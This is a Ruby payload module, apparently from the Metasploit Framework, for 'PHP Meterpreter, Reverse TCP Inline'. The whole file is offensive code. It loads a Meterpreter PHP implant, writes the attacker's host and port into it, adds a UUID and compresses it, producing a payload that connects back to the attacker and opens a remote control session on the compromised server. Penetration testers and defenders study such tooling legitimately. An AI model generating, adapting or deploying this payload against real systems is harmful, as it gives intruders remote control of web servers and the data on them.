##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/php/reverse_tcp'
require 'msf/base/sessions/meterpreter_php'
require 'msf/base/sessions/meterpreter_options'


module Metasploit4

  CachedSize = 25685

  include Msf::Payload::Single
  include Msf::Payload::Php::ReverseTcp
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'PHP Meterpreter, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a Meterpreter server (PHP)',
      'Author'        => ['egypt'],
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'License'       => MSF_LICENSE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::Meterpreter_Php_Php))
  end

  def generate
    file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.php")
    met = File.open(file, "rb") {|f|
      f.read(f.stat.size)
    }

    met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
    met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']

    uuid = generate_payload_uuid
    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")

    met.gsub!(/#.*$/, '')
    met = Rex::Text.compress(met)
    met
  end
end
